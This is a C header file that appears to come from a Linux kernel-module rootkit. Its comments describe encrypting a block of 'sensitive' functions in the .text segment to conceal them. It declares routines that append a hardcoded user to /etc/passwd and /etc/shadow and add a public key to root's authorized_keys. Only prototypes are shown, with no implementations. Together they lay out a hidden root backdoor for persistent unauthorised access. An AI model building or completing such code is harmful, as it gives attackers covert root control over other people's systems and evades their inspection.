#ifndef SENSITIVE_INCLUDE
#define SENSITIVE_INCLUDE

// Length in bytes of the .text segment to encrypt. Encryption is currently naive: identify first
// sensitive function and encrypt SENSITIVE_LEN bytes from that point. Assumes contiguous
// function placement. So kernel would crumble if a) gcc made function layout in the elf image
// non-deterministic; or b) the kernel module loader decided to do the same.
#define SENSITIVE_LEN 0x58b

/*
Should be done properly like so:

struct sensitive_funcs {
  void   *addr;
  size_t len;
};

struct sensitive_funcs sf[] = {
  {add_file_line,   0xd},
  {add_user_passwd, 0xa},
  {add_user_shadow, 0xd},
  {add_root_pubkey, 0xa},
}
*/

// Helper function to append a line (string) to a file
int add_file_line(const char *, const char *);
// Add hardcoded user to /etc/passwd
int add_user_passwd(void);
// Add hardcoded user to /etc/shadow
int add_user_shadow(void);
// Add public key to root user's authorized_keys file
int add_root_pubkey(void);

#endif
